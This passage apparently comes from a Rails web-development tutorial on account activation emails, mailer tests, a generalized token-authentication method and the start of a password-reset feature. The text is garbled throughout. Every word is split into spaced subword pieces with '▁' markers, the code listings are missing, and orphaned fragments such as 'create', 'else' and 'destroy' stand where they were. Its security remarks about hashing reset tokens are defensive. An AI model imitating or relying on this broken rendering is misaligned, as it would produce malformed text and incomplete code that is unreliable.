▁A ▁working ▁preview ▁method ▁for ▁account ▁activation .
▁With ▁the ▁preview ▁code ▁as ▁in ▁Listing ~\ ref { code : account _ activation _ preview }, ▁we ▁can ▁visit ▁the ▁suggest ed ▁URLs ▁to ▁preview ▁the ▁account ▁activation ▁email s .
▁The ▁result ing ▁HTML ▁and ▁text ▁email s ▁appear ▁as ▁in ▁F igure ~\ ref { fig : account _ activation _ html _ preview } ▁and ▁F igure ~\ ref { fig : account _ activation _ text _ preview }.
▁A ▁preview ▁of ▁HTML ▁version ▁of ▁the ▁account ▁activation ▁email .
▁A ▁preview ▁of ▁text ▁version ▁the ▁account ▁activation ▁email .
▁As ▁a ▁final ▁step , ▁we ' ll ▁write ▁a ▁couple ▁of ▁tests ▁to ▁double - check ▁the ▁results ▁show n ▁in ▁the ▁email ▁preview s .
▁This ▁is n ' t ▁as ▁hard ▁as ▁it ▁ s ound s , ▁because ▁Rails ▁has ▁generated ▁useful ▁example ▁tests ▁for ▁us ▁( Listing ~\ ref { code : generated _ user _ mailer _ test }).
▁The ▁User ▁mailer ▁test ▁generated ▁by ▁Rails .
▁The ▁tests ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ test } ▁use ▁the ▁powerful ▁\ k ode { assert \_ match } ▁method , ▁which ▁can ▁be ▁used ▁either ▁with ▁a ▁string ▁or ▁a ▁regular ▁expression :
▁The ▁test ▁in ▁Listing ~\ ref { code : re al _ account _ activation _ test } ▁uses ▁\ k ode { assert \_ match } ▁to ▁check ▁that ▁the ▁name , ▁activation ▁token , ▁and ▁escape d ▁email ▁appear ▁in ▁the ▁email ' s ▁body .
▁For ▁the ▁last ▁of ▁these , ▁note ▁the ▁use ▁of
▁to ▁escape ▁the ▁test ▁user ' s ▁email
▁The ▁way ▁to ▁learn ▁how ▁to ▁do ▁something ▁like ▁this ▁is ▁by ▁\ href { http :// l m gt f y . com / ? q = ruby + rails + escape + url }{ G oo g l ing ▁`` ruby ▁rails ▁escape ▁url '' }.
▁You ▁will ▁\ href { http :// stack overflow . com / questions / 6 7 1 4 19 6 / ruby - url - en coding - string }{ find ▁two ▁main ▁possibilities }, ▁\ k ode { U R I :: en code ( str )} ▁and ▁\ k ode { C G I :: escape ( str ) }.
▁T ry ing ▁them ▁both ▁re ve al s ▁that ▁the ▁latter ▁works .
▁( Actually , ▁there ' s ▁a ▁third ▁possibility ▁as ▁well : ▁the ▁\ k ode { ER B :: U til } ▁library ▁ s up p li es ▁a ▁\ href { http :// api doc k . com / ruby / ER B / U til / url _ en code }{ url \_ en code } ▁method ▁that ▁has ▁the ▁same ▁effect .)
▁A ▁test ▁of ▁the ▁current ▁email ▁implementation .
▁Note ▁that ▁Listing ~\ ref { code : re al _ account _ activation _ test } ▁take s ▁care ▁to ▁add ▁an ▁activation ▁token ▁to ▁the ▁fixture ▁user , ▁which ▁would ▁otherwise ▁be ▁blank .
▁To ▁get ▁the ▁test ▁to ▁pass , ▁we ▁have ▁to ▁configure ▁our ▁test ▁file ▁with ▁the ▁proper ▁domain ▁host , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ domain _ host }.
▁Setting ▁the ▁test ▁domain ▁host .
▁With ▁the ▁code ▁as ▁above , ▁the ▁mailer ▁test ▁should ▁be ▁\ passing :
▁ $ ▁bundle ▁exec ▁rake ▁test : mailer s
▁To ▁use ▁the ▁mailer ▁in ▁our ▁application , ▁we ▁just ▁need ▁to ▁add ▁a ▁couple ▁of ▁lines ▁to ▁the ▁\ k ode { create } ▁action ▁used ▁to ▁sign ▁users ▁up , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ signup _ with _ account _ activation }.
▁Note ▁that ▁Listing ~\ ref { code : user _ signup _ with _ account _ activation } ▁has ▁changed ▁the ▁redirect ▁behavior ▁upon ▁sign ing ▁up .
▁Before , ▁we ▁redirect ed ▁to ▁the ▁user ' s ▁profile ▁page ▁( Section ~\ ref { sec : successful _ signup s }), ▁but ▁that ▁does n ' t ▁make ▁sense ▁now ▁that ▁we ' re ▁requiring ▁account ▁activation .
▁Instead , ▁we ▁now ▁redirect ▁to ▁the ▁root ▁URL .
▁ Adding ▁account ▁activation ▁to ▁user ▁signup .
▁create
▁< n > ▁else
▁instead ▁of
▁We ' ll ▁fix ▁this ▁by ▁t emporarily ▁comment ing ▁out ▁the ▁failing ▁lines , ▁as ▁show n ▁in ▁Listing ~\ ref { code : comment _ out _ failing _ tests }.
▁We ' ll ▁uncomment ▁those ▁lines ▁and ▁write ▁passing ▁tests ▁for ▁account ▁activation ▁in ▁Section ~\ ref { sec : activation _ test _ and _ refactoring }.
▁T emporarily ▁comment ing ▁out ▁failing ▁tests .
▁If ▁you ▁now ▁try ▁sign ing ▁up ▁as ▁a ▁new ▁user , ▁you ▁should ▁be ▁redirect ed ▁as ▁show n ▁in ▁F igure ~\ ref { fig : redirect ed _ not _ activated }, ▁and ▁an ▁email ▁like ▁the ▁one ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ email } ▁should ▁be ▁generated .
▁Note ▁that ▁you ▁will ▁\ emph { not } ▁receive ▁an ▁actual ▁email ▁in ▁a ▁development ▁environment , ▁but ▁it ▁will ▁show ▁up ▁in ▁your ▁server ▁log s .
▁( You ▁may ▁have ▁to ▁ sc r o ll ▁up ▁a ▁bit ▁to ▁see ▁it .)
▁Section ~\ ref { sec : email _ in _ production } ▁discuss es ▁how ▁to ▁send ▁email ▁for ▁real ▁in ▁a ▁production ▁environment .
▁A ▁sample ▁account ▁activation ▁email ▁from ▁the ▁server ▁log .
▁S ent ▁mail ▁to ▁ michael @ michael hartl . com ▁( 9 3 1 . 6 m s )< n > Date : ▁We d , ▁0 3 ▁Sep ▁2014 ▁ 19 : 4 7 : 18 ▁ + 0000 < n > From : ▁no reply @ example . com < n > To : ▁ michael @ michael hartl . com < n > Message - ID : ▁< 5407704 7 4 e 16 _ 6 1 d 3 f d 19 1 4 f 4 cd 0 3 00 a 0 @ mhartl - rails - tutorial - 9 5 37 5 3 . mail >< n > S u b j ec t : ▁ Account ▁activation < n > M i me - Version : ▁1. 0 < n > Content - Type : ▁multipart / alternative ; < n > ▁b ound ary =" - - = = _ mime part _ 5407704 6 5 6 b 50 _ 6 1 d 3 f d 19 1 4 f 4 cd 02 99 6 a " ; < n > ▁ cha r set = UT F -8 < n > Content - Transfer - Encoding : ▁7 b it < n >< n >< n > - --- = = _ mime part _ 5407704 6 5 6 b 50 _ 6 1 d 3 f d 19 1 4 f 4 cd 02 99 6 a < n > Content - Type : ▁text / plain ; < n > ▁ cha r set = UT F -8 < n > Content - Transfer - Encoding : ▁7 b it < n >< n > H i ▁ Michael ▁Hartl ,< n >< n > Welcome ▁to ▁the ▁S ample ▁App !
▁Click ▁on ▁the ▁link ▁below ▁to ▁activate ▁your ▁account : < n >< n > http :// rails - tutorial - c 9 - mhartl . c 9 . io / account _ activation s / < n > f F b _ F 9 4 m g Q t m l S v R F G s I T w / edit ?
▁email = michael %40 michael hartl . com < n > - --- = = _ mime part _ 5407704 6 5 6 b 50 _ 6 1 d 3 f d 19 1 4 f 4 cd 02 99 6 a < n > Content - Type : ▁text / html ; < n > ▁ cha r set = UT F -8 < n > Content - Transfer - Encoding : ▁7 b it < n >< n >< h 1> S ample ▁App </ h 1 >< n >< n >< p > H i ▁ Michael ▁Hartl , </ p >< n >< n >< p >< n > Welcome ▁to ▁the ▁S ample ▁App !
▁Click ▁on ▁the ▁link ▁below ▁to ▁activate ▁your ▁account : < n ></ p >< n >< n >< a ▁ href =" http :// rails - tutorial - c 9 - mhartl . c 9 . io / account _ activation s / < n > f F b _ F 9 4 m g Q t m l S v R F G s I T w / edit ?
▁email = michael %40 michael hartl . com "> A c t i v ate </ a >< n > - --- = = _ mime part _ 5407704 6 5 6 b 50 _ 6 1 d 3 f d 19 1 4 f 4 cd 02 99 6 a - -
▁The ▁Home ▁page ▁with ▁an ▁activation ▁message ▁after ▁signup .
▁Now ▁that ▁we ▁have ▁a ▁correctly ▁generated ▁email ▁as ▁in ▁Listing ~\ ref { code : account _ activation _ email }, ▁we ▁need ▁to ▁write ▁an ▁\ k ode { edit } ▁action ▁in ▁the ▁ Account ▁A c t i v ation s ▁controller ▁to ▁activate ▁the ▁user .
▁Recall ▁from ▁the ▁discussion ▁in ▁Section ~\ ref { sec : account _ activation _ mailer } ▁that ▁the ▁activation ▁token ▁and ▁email ▁are ▁available ▁as ▁\ k ode { params [: id ]} ▁and ▁\ k ode { params [: email ]} , ▁respectively .
▁Follow ing ▁the ▁model ▁of ▁passwords ▁( Listing ~\ ref { code : find _ authenticate _ user }) ▁and ▁remember ▁token s ▁( Listing ~\ ref { code : persistent _ current _ user }), ▁we ▁plan ▁to ▁find ▁and ▁authenticate ▁the ▁user ▁with ▁code ▁something ▁like ▁this :
▁( As ▁we ' ll ▁see ▁in ▁a ▁moment , ▁there ▁will ▁be ▁one ▁extra ▁boolean ▁in ▁the ▁expression ▁above .
▁See ▁if ▁you ▁can ▁guess ▁what ▁it ▁will ▁be .)
▁The ▁above ▁code ▁uses ▁the ▁\ k ode { authenticated ?}\ ▁method ▁to ▁test ▁if ▁the ▁account ▁activation ▁digest ▁matches ▁the ▁given ▁token , ▁but ▁at ▁present ▁this ▁won ' t ▁work ▁because ▁that ▁method ▁is ▁special ize d ▁to ▁the ▁remember ▁token ▁( Listing ~\ ref { code : authenticated _ p }) :
▁Here ▁\ k ode { remember \_ digest } ▁is ▁an ▁attribute ▁on ▁the ▁User ▁model , ▁and ▁inside ▁the ▁model ▁we ▁can ▁re write ▁it ▁as ▁follows :
▁Some how , ▁we ▁want ▁to ▁be ▁able ▁to ▁make ▁this ▁\ emph { variable }, ▁so ▁we ▁can ▁call
▁instead ▁by ▁passing ▁in ▁the ▁appropriate ▁parameter ▁to ▁\ k ode { authenticated ? }.
▁The ▁solution ▁involve s ▁our ▁first ▁example ▁of ▁\ emph { meta prog r am m ing }, ▁which ▁is ▁essential ly ▁a ▁program ▁that ▁write s ▁a ▁program .
▁( M et a prog r am m ing ▁is ▁one ▁of ▁Ruby ' s ▁ strong est ▁suit s , ▁and ▁many ▁of ▁the ▁`` magic '' ▁features ▁of ▁Rails ▁are ▁due ▁to ▁its ▁use ▁of ▁Ruby ▁ meta prog r am m ing .)
▁The ▁key ▁in ▁this ▁case ▁is ▁the ▁powerful ▁\ k ode { s end } ▁method , ▁which ▁let s ▁us ▁call ▁a ▁method ▁with ▁a ▁name ▁of ▁our ▁choice ▁by ▁`` s end ing ▁a ▁message '' ▁to ▁a ▁given ▁object .
▁For ▁example , ▁in ▁this ▁console ▁session ▁we ▁use ▁\ k ode { s end } ▁on ▁a ▁native ▁Ruby ▁object ▁to ▁find ▁the ▁length ▁of ▁an ▁array :
▁Here ▁we ▁see ▁that ▁passing ▁the ▁symbol ▁\ k ode { : length } ▁or ▁string ▁\ k ode { ' length ' } ▁to ▁\ k ode { s end } ▁is ▁equivalent ▁to ▁calling ▁the ▁\ k ode { length } ▁method ▁on ▁the ▁given ▁object .
▁As ▁a ▁second ▁example , ▁we ' ll ▁access ▁the ▁\ k ode { activation \_ digest } ▁attribute ▁of ▁the ▁first ▁user ▁in ▁the ▁database :
▁Note ▁in ▁the ▁last ▁example ▁that ▁we ' ve ▁defined ▁an ▁\ k ode { attribute } ▁variable ▁equal ▁to ▁the ▁symbol ▁\ k ode { : activation } ▁and ▁used ▁string ▁interpolation ▁to ▁build ▁up ▁the ▁proper ▁argument ▁to ▁\ k ode { s end }.
▁This ▁would ▁work ▁also ▁with ▁the ▁string ▁\ k ode { ' activation ' }, ▁but ▁using ▁a ▁symbol ▁is ▁more ▁conventional , ▁and ▁in ▁either ▁case
▁becomes
▁" activation _ digest "
▁once ▁the ▁string ▁is ▁interpolate d .
▁( We ▁saw ▁how ▁symbols ▁are ▁interpolate d ▁as ▁strings ▁in ▁Section ~\ ref { sec : the _ flash }. )
▁With ▁this ▁template ▁in ▁place , ▁we ▁can ▁general ize ▁the ▁method ▁by ▁adding ▁a ▁function ▁argument ▁with ▁the ▁name ▁of ▁the ▁digest , ▁and ▁the n ▁use ▁string ▁interpolation ▁as ▁above :
▁( Here ▁we ▁have ▁re name d ▁the ▁second ▁argument ▁\ k ode { token } ▁to ▁emphasize ▁that ▁it ' s ▁now ▁generic .)
▁Because ▁we ' re ▁inside ▁the ▁user ▁model , ▁we ▁can ▁also ▁omit ▁\ k ode { self }, ▁yield ing ▁the ▁most ▁idiomatic ally ▁correct ▁version :
▁We ▁can ▁now ▁re p r o d u ce ▁the ▁previous ▁behavior ▁of ▁\ k ode { authenticated ?}\ ▁by ▁in v o k ing ▁it ▁like ▁this :
▁in ▁Listing ~\ ref { code : generalized _ authenticated _ p }.
▁A ▁ generalized ▁\ k ode { authenticated ?}\
▁method .
▁ $ ▁bundle ▁exec ▁rake ▁test
▁To ▁fix ▁this , ▁we ▁simply ▁update ▁the ▁two ▁cases ▁to ▁use ▁the ▁ generalized ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : generalized _ current _ user } ▁and ▁Listing ~\ ref { code : test _ authenticated _ invalid _ token _ updated }.
▁Using ▁the ▁ generalized ▁\ k ode { authenticated ?}\
▁# ▁Return s ▁the ▁current ▁logged - in ▁user ▁( if ▁any ).
▁< n > ▁end
▁At ▁this ▁point , ▁the ▁tests ▁should ▁be ▁\ passing :
▁Re factor ing ▁the ▁code ▁as ▁above ▁is ▁in credibly ▁more ▁error - prone ▁without ▁a ▁so li d ▁test ▁suite , ▁which ▁is ▁why ▁we ▁we n t ▁to ▁such ▁trouble ▁to ▁write ▁good ▁tests ▁in ▁Section ~\ ref { sec : login _ with _ remember ing } ▁and ▁Section ~\ ref { sec : remember _ tests }.
▁With ▁the ▁\ k ode { authenticated ?}\ ▁method ▁as ▁in ▁Listing ~\ ref { code : generalized _ authenticated _ p }, ▁we ' re ▁now ▁ready ▁to ▁write ▁an ▁\ k ode { edit } ▁action ▁that ▁authenticate s ▁the ▁user ▁corresponding ▁to ▁the ▁email ▁address ▁in ▁the ▁\ k ode { params } ▁hash .
▁Ou r ▁test ▁for ▁validity ▁will ▁look ▁like ▁this :
▁This ▁prevent s ▁our ▁code ▁from ▁ activating ▁users ▁who ▁have ▁already ▁been ▁ activated , ▁which ▁is ▁important ▁because ▁we ' ll ▁be ▁logging ▁in ▁users ▁upon ▁confirmation , ▁and ▁we ▁don ' t ▁want ▁to ▁allow ▁attacker s ▁who ▁manage ▁to ▁obtain ▁the ▁activation ▁link ▁to ▁log ▁in ▁as ▁the ▁user .
▁If ▁the ▁user ▁is ▁ authenticated ▁according ▁to ▁the ▁boolean s ▁above , ▁we ▁need ▁to ▁activate ▁the ▁user ▁and ▁update ▁the ▁\ k ode { activated \_ at } ▁timestamp :
▁This ▁lead s ▁to ▁the ▁\ k ode { edit } ▁action ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action }.
▁Note ▁also ▁that ▁Listing ~\ ref { code : account _ activation _ edit _ action } ▁handle s ▁the ▁case ▁of ▁an ▁invalid ▁activation ▁token ; ▁this ▁should ▁rare ly ▁happen , ▁but ▁it ' s ▁easy ▁enough ▁to ▁redirect ▁in ▁this ▁case ▁to ▁the ▁root ▁URL .
▁An ▁\ k ode { edit } ▁action ▁to ▁activate ▁account s .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action }, ▁you ▁should ▁now ▁be ▁able ▁to ▁ past e ▁in ▁the ▁URL ▁from ▁Listing ~\ ref { code : account _ activation _ email } ▁to ▁activate ▁the ▁relevant ▁user .
▁For ▁example , ▁on ▁my ▁system ▁I ▁visit ed ▁the ▁URL
▁ http :// rails - tutorial - c 9 - mhartl . c 9 . io / account _ activation s / < n > f F b _ F 9 4 m g Q t m l S v R F G s I T w / edit ?
▁email = michael %40 michael hartl . com
▁and ▁go t ▁the ▁result ▁show n ▁in ▁F igure ~\ ref { fig : activated _ user }.
▁The ▁profile ▁page ▁after ▁a ▁successful ▁activation .
▁Of ▁course , ▁current ly ▁user ▁activation ▁does n ' t ▁actually ▁\ emph { do } ▁anything , ▁because ▁we ▁have n ' t ▁changed ▁how ▁users ▁log ▁in .
▁In ▁order ▁to ▁have ▁account ▁activation ▁mean ▁something , ▁we ▁need ▁to ▁allow ▁users ▁to ▁log ▁in ▁only ▁if ▁they ▁are ▁ activated .
▁As ▁show n ▁in ▁Listing ~\ ref { code : prev ent ing _ un activated _ login s }, ▁the ▁way ▁to ▁do ▁this ▁is ▁to ▁log ▁the ▁user ▁in ▁as ▁usual ▁if ▁\ k ode { user . activated ?}\ ▁is ▁true ; ▁otherwise , ▁we ▁redirect ▁to ▁the ▁root ▁URL ▁with ▁a ▁\ k ode { warning } ▁message ▁( F igure ~\ ref { fig : not _ activated _ warning }).
▁P r even ting ▁un activated ▁users ▁from ▁logging ▁in .
▁< n > ▁else
▁destroy
▁The ▁warning ▁message ▁for ▁a ▁not - y et - activated ▁user .
▁With ▁that , ▁a part ▁from ▁one ▁refinement , ▁the ▁basic ▁functionality ▁of ▁user ▁activation ▁is ▁done .
▁( T h at ▁refinement ▁is ▁prevent ing ▁un activated ▁users ▁from ▁being ▁displayed , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : activation _ resets _ exercises }).)
▁In ▁Section ~\ ref { sec : activation _ test _ and _ refactoring }, ▁we ' ll ▁complete ▁the ▁process ▁by ▁adding ▁some ▁tests ▁and ▁the n ▁doing ▁a ▁little ▁refactoring .
▁In ▁this ▁section , ▁we ' ll ▁add ▁an ▁integration ▁test ▁for ▁account ▁activation .
▁Because ▁we ▁already ▁have ▁a ▁test ▁for ▁sign ing ▁up ▁with ▁valid ▁information , ▁we ' ll ▁add ▁the ▁steps ▁to ▁the ▁test ▁ developed ▁in ▁Section ~\ ref { sec : a _ test _ for _ valid _ submission } ▁( Listing ~\ ref { code : a _ test _ for _ valid _ submission }).
▁There ▁are ▁quite ▁a ▁few ▁steps , ▁but ▁they ▁are ▁most ly ▁straightforward ; ▁see ▁if ▁you ▁can ▁follow ▁along ▁in ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test }.
▁ Adding ▁account ▁activation ▁to ▁the ▁user ▁signup ▁test .
▁# ▁T ry ▁to ▁log ▁in ▁before ▁activation .
▁follow _ redirect !
▁There ' s ▁a ▁lot ▁of ▁code ▁in ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test }, ▁but ▁the ▁only ▁completely ▁no ve l ▁code ▁is ▁in ▁the ▁line
▁This ▁code ▁verifie s ▁that ▁exactly ▁1 ▁message ▁was ▁ deliver ed .
▁we ▁have
▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁also ▁uses ▁the ▁\ k ode { assigns } ▁method ▁for ▁the ▁first ▁time ▁in ▁the ▁main ▁tutorial ; ▁as ▁explained ▁in ▁the ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁exercise ▁( Section ~\ ref { sec : log _ in _ out _ exercises }), ▁\ k ode { assigns } ▁let s ▁us ▁access ▁instance ▁variables ▁in ▁the ▁corresponding ▁action .
▁For ▁example , ▁the ▁Users ▁controller ' s ▁\ k ode { create } ▁action ▁defines ▁an ▁\ k ode {@ user } ▁variable ▁( Listing ~\ ref { code : user _ signup _ with _ account _ activation }), ▁so ▁we ▁can ▁access ▁it ▁in ▁the ▁test ▁using ▁\ k ode { assigns (: user ) }.
▁F inally , ▁note ▁that ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁re store s ▁the ▁lines ▁we ▁comment ed ▁out ▁in ▁Listing ~\ ref { code : comment _ out _ failing _ tests }.
▁At ▁this ▁point , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁With ▁the ▁test ▁in ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test }, ▁we ' re ▁ready ▁to ▁refactor ▁a ▁little ▁by ▁mov ing ▁some ▁of ▁the ▁user ▁ manipulati on ▁out ▁of ▁the ▁controller ▁and ▁into ▁the ▁model .
▁In ▁particular , ▁we ' ll ▁make ▁an ▁\ k ode { ac t i v ate } ▁method ▁to ▁update ▁the ▁user ' s ▁activation ▁attributes ▁and ▁a ▁\ k ode { s end \_ activation \_ email } ▁to ▁send ▁the ▁activation ▁email .
▁The ▁extra ▁methods ▁appear ▁in ▁Listing ~\ ref { code : user _ activation _ methods }, ▁and ▁the ▁ refactored ▁application ▁code ▁appears ▁in ▁Listing ~\ ref { code : user _ signup _ refactored } ▁and ▁Listing ~\ ref { code : account _ activation _ refactored }.
▁ Adding ▁user ▁activation ▁methods ▁to ▁the ▁User ▁model .
▁# ▁A c t i v ate s ▁an ▁account .
▁< n > ▁ .
▁S end ing ▁email ▁via ▁the ▁user ▁model ▁object .
▁ Account ▁activation ▁via ▁the ▁user ▁model ▁object .
▁Note ▁that ▁Listing ~\ ref { code : user _ activation _ methods } ▁eliminate s ▁the ▁use ▁of ▁\ k ode { user . }, ▁which ▁would ▁break ▁inside ▁the ▁User ▁model ▁because ▁there ▁is ▁no ▁such ▁variable :
▁( We ▁could ▁have ▁switch ed ▁from ▁\ k ode { user } ▁to ▁\ k ode { self }, ▁but ▁recall ▁from ▁Section ~\ ref { sec : uniqueness _ validation } ▁that ▁\ k ode { self } ▁is ▁optional ▁inside ▁the ▁model .)
▁It ▁also ▁changes ▁\ k ode {@ user } ▁to ▁\ k ode { self } ▁in ▁the ▁call ▁to ▁the ▁User ▁mailer :
▁These ▁are ▁\ emph { exactly } ▁the ▁kind s ▁of ▁details ▁that ▁are ▁easy ▁to ▁m is s ▁during ▁even ▁a ▁simple ▁refactoring ▁but ▁will ▁be ▁ ca ug h t ▁by ▁a ▁good ▁test ▁suite .
▁S p e a k ing ▁of ▁which , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁ Account ▁activation ▁is ▁now ▁complete d , ▁which ▁is ▁a ▁m il est one ▁worth y ▁of ▁a ▁commit :
▁Having ▁complete d ▁account ▁activation ▁( and ▁there by ▁verifie d ▁the ▁user ' s ▁email ▁address ), ▁we ' re ▁now ▁in ▁a ▁good ▁position ▁to ▁handle ▁the ▁common ▁case ▁of ▁users ▁for getting ▁their ▁passwords .
▁As ▁we ' ll ▁see , ▁many ▁of ▁the ▁steps ▁are ▁similar , ▁and ▁we ▁will ▁have ▁sever al ▁opportunit ies ▁to ▁apply ▁the ▁less on s ▁ learned ▁in ▁Section ~\ ref { sec : account _ activation }.
▁The ▁beginning ▁is ▁different , ▁though ; ▁unlike ▁account ▁activation , ▁implement ing ▁password ▁resets ▁requires ▁both ▁a ▁change ▁to ▁one ▁of ▁our ▁views ▁and ▁two ▁new ▁forms ▁( to ▁handle ▁email ▁and ▁new ▁password ▁submission ).
▁Before ▁writing ▁any ▁code , ▁let ' s ▁mock ▁up ▁the ▁expected ▁sequence ▁for ▁reset ting ▁passwords .
▁We ' ll ▁start ▁by ▁adding ▁a ▁`` forgot ▁password '' ▁link ▁to ▁the ▁sample ▁application ' s ▁login ▁form ▁( F igure ~\ ref { fig : login _ forgot _ password _ mockup }).
▁The ▁`` forgot ▁password '' ▁link ▁will ▁go ▁to ▁a ▁page ▁with ▁a ▁form ▁that ▁take s ▁in ▁an ▁email ▁address ▁and ▁send s ▁an ▁email ▁containing ▁a ▁password ▁reset ▁link ▁( F igure ~\ ref { fig : forgot _ password _ form _ mockup }).
▁The ▁reset ▁link ▁will ▁go ▁to ▁a ▁form ▁for ▁reset ting ▁the ▁user ' s ▁password ▁( with ▁confirmation ) ▁( F igure ~\ ref { fig : reset _ password _ form _ mockup }).
▁A ▁mockup ▁of ▁a ▁`` forgot ▁password '' ▁link .
▁A ▁mockup ▁of ▁the ▁`` forgot ▁password '' ▁form .
▁A ▁mockup ▁of ▁the ▁reset ▁password ▁form .
▁In ▁analogy ▁with ▁account ▁activation s , ▁our ▁general ▁plan ▁is ▁to ▁make ▁a ▁ Password ▁Re set s ▁resource , ▁with ▁each ▁password ▁reset ▁consist ing ▁of ▁a ▁reset ▁token ▁and ▁corresponding ▁reset ▁digest . ▁The ▁primary ▁sequence ▁go es ▁like ▁this :
▁When ▁a ▁user ▁requests ▁a ▁password ▁reset , ▁find ▁the ▁user ▁by ▁the ▁submitted ▁email ▁address .
▁If ▁the ▁email ▁address ▁exists ▁in ▁the ▁database , ▁generate ▁a ▁reset ▁token ▁and ▁corresponding ▁reset ▁digest .
▁S a ve ▁the ▁reset ▁digest ▁to ▁the ▁database , ▁and ▁the n ▁send ▁an ▁email ▁to ▁the ▁user ▁with ▁a ▁link ▁containing ▁the ▁reset ▁token ▁and ▁user ' s ▁email ▁address .
▁When ▁the ▁user ▁click s ▁the ▁link , ▁find ▁the ▁user ▁by ▁email ▁address , ▁and ▁the n ▁authenticate ▁the ▁token ▁by ▁compar ing ▁to ▁the ▁reset ▁digest .
▁If ▁ authenticated , ▁present ▁the ▁user ▁with ▁the ▁form ▁for ▁changing ▁the ▁password .
▁As ▁with ▁account ▁activation s ▁( Section ~\ ref { sec : account _ activation s _ resource }), ▁our ▁first ▁step ▁is ▁to ▁generate ▁a ▁controller ▁for ▁our ▁new ▁resource :
▁As ▁in ▁Section ~\ ref { sec : account _ activation s _ resource }, ▁we ' ve ▁included ▁a ▁flag ▁to ▁skip ▁ generating ▁tests ▁and ▁will ▁instead ▁build ▁on ▁the ▁integration ▁test ▁from ▁Section ~\ ref { sec : activation _ test _ and _ refactoring }.
▁Because ▁we ' ll ▁need ▁forms ▁both ▁for ▁creating ▁new ▁password ▁resets ▁\ line break ▁( F igure ~\ ref { fig : forgot _ password _ form _ mockup }) ▁and ▁for ▁updating ▁them ▁by ▁changing ▁the ▁password ▁in ▁the ▁User ▁model ▁( F igure ~\ ref { fig : reset _ password _ form _ mockup }), ▁we ▁need ▁routes ▁for ▁\ k ode { new }, ▁\ k ode { create }, ▁\ k ode { edit }, ▁and ▁\ k ode { update }.
▁We ▁can ▁arrange ▁this ▁with ▁the ▁\ k ode { resources } ▁line ▁show n ▁in ▁Listing ~\ ref { code : password _ resets _ resource }.
▁ Adding ▁a ▁resource ▁for ▁password ▁resets .
▁The ▁code ▁in ▁Listing ~\ ref { code : password _ resets _ resource } ▁arrange s ▁for ▁the ▁RESTful ▁routes ▁show n ▁in ▁Table ~\ ref { table : RESTful _ password _ resets }.
▁In ▁particular , ▁the ▁first ▁route ▁in ▁Table ~\ ref { table : RESTful _ password _ resets } ▁gives ▁a ▁link ▁to ▁the ▁`` forgot ▁password '' ▁form ▁via
▁new _ password _ reset _ path
▁as ▁seen ▁in ▁Listing ~\ ref { code : log _ in _ password _ reset } ▁and ▁F igure ~\ ref { fig : forgot _ password _ link }.
▁HTTP ▁request
▁Name d ▁route
▁RESTful ▁routes ▁provided ▁by ▁the ▁ Password ▁Re set s ▁resource ▁in ▁Listing ~\ ref { code : password _ resets _ resource }.
▁ Adding ▁a ▁link ▁to ▁password ▁resets .
▁ Sign ▁up
▁</ div >
▁The ▁login ▁page ▁with ▁a ▁`` forgot ▁password '' ▁link .
▁The ▁data ▁model ▁for ▁password ▁resets ▁is ▁similar ▁to ▁the ▁one ▁used ▁for ▁account ▁activation ▁( F igure ~\ ref { fig : user _ model _ account _ activation }).
▁Follow ing ▁the ▁pattern ▁set ▁by ▁remember ▁token s ▁( Section ~\ ref { sec : remember _ me }) ▁and ▁account ▁activation ▁token s ▁( Section ~\ ref { sec : account _ activation }), ▁password ▁resets ▁will ▁pair ▁a ▁virtual ▁reset ▁token ▁for ▁use ▁in ▁the ▁reset ▁email ▁with ▁a ▁corresponding ▁reset ▁digest ▁for ▁retriev ing ▁the ▁user .
▁If ▁we ▁instead ▁store d ▁an ▁un hash ed ▁token , ▁an ▁attacker ▁with ▁access ▁to ▁the ▁database ▁could ▁send ▁a ▁reset ▁request ▁to ▁the ▁user ' s ▁email ▁address ▁and ▁the n ▁use ▁the ▁token ▁and ▁email ▁to ▁visit ▁the ▁corresponding ▁password ▁reset ▁link , ▁there by ▁gain ing ▁control ▁of ▁the ▁account .
▁Using ▁a ▁digest ▁for ▁password ▁resets ▁is ▁thus ▁essential .
▁As ▁an ▁ additional ▁security ▁precaution , ▁we ' ll ▁also ▁plan ▁to ▁\ emph { expire } ▁the ▁reset ▁link ▁after ▁a ▁couple ▁of ▁hours , ▁which ▁requires ▁record ing ▁the ▁time ▁when ▁the ▁reset ▁get s ▁sent .
▁The ▁result ing ▁\ k ode { reset \_ digest } ▁and ▁\ k ode { reset \_ s ent \_ at } ▁attributes ▁appear ▁in ▁F igure ~\ ref { fig : user _ model _ password _ reset }.
▁The ▁User ▁model ▁with ▁added ▁password ▁reset ▁attributes .
▁The ▁migration ▁to ▁add ▁the ▁attributes ▁from ▁F igure ~\ ref { fig : user _ model _ password _ reset } ▁appears ▁as ▁follows :
▁We ▁the n ▁ migrate ▁as ▁usual :
▁To ▁make ▁the ▁view ▁for ▁new ▁password ▁resets , ▁we ' ll ▁work ▁in ▁analogy ▁with ▁the ▁previous ▁form ▁for ▁making ▁a ▁new ▁non - - Active ▁Record ▁resource , ▁name ly , ▁the ▁login ▁form ▁( Listing ~\ ref { code : login _ form }) ▁for ▁creating ▁a ▁new ▁session , ▁show n ▁again ▁in ▁Listing ~\ ref { code : login _ form _ redux } ▁for ▁reference .
▁Re view ing ▁the ▁code ▁for ▁the ▁login ▁form .
▁The ▁new ▁password ▁resets ▁form ▁has ▁a ▁lot ▁in ▁common ▁with ▁Listing ~\ ref { code : login _ form _ redux } ; ▁the ▁most ▁important ▁difference s ▁are ▁the ▁use ▁of ▁a ▁different ▁resource ▁and ▁URL ▁in ▁the ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁the ▁omission ▁of ▁the ▁password ▁attribute .
